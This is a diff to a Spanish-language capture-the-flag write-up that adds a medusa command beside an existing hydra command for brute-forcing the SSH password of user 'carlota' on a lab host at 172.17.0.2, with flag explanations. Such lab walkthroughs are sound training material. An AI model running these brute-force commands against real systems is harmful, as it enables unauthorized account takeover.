@@ -85,7 +85,8 @@ ________________________________________________________________________________
 
 ## Fuerza Bruta
 
-Como obtuvimos dos nombres anteriormente, vamos a intenta hacer fuerza bruta con uno de ellos.
+Como obtuvimos dos nombres anteriormente, vamos a intenta hacer fuerza bruta con uno de ellos. En este caso usaremos dos herramientas diferentes aunque con el mismo resultado.
+
 ~~~ bash
 hydra -l carlota -P /usr/share/wordlists/rockyou.txt -t4 ssh://172.17.0.2
 ~~~
@@ -97,6 +98,17 @@ hydra -l carlota -P /usr/share/wordlists/rockyou.txt -t4 ssh://172.17.0.2
 - `-P`: Especificar una lista de palabras.
 - `-t4`: Especificar hilos a usar. (más rapido)
 - `ssh`: Especifica el protocolo.
+
+~~~ bash
+medusa -h 172.17.0.2 -u carlota -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
+~~~
+![gobuster](https://i.imgur.com/qsO45ms.png)
+
+- `-h`: Especifica la dirección IP del objetivo.
+- `-u`: Especifica el nombre de usuario a probar.
+- `-P`: Especifica el archivo de lista de contraseñas a utilizar.
+- `-M`: Especifica el módulo a utilizar, en este caso SSH.
+- `-t 4`: Especifica el número de hilos a utilizar para agilizar el proceso.
 
 ¡¡BINGO!! obtuvimos las credenciales de Carlota.
 
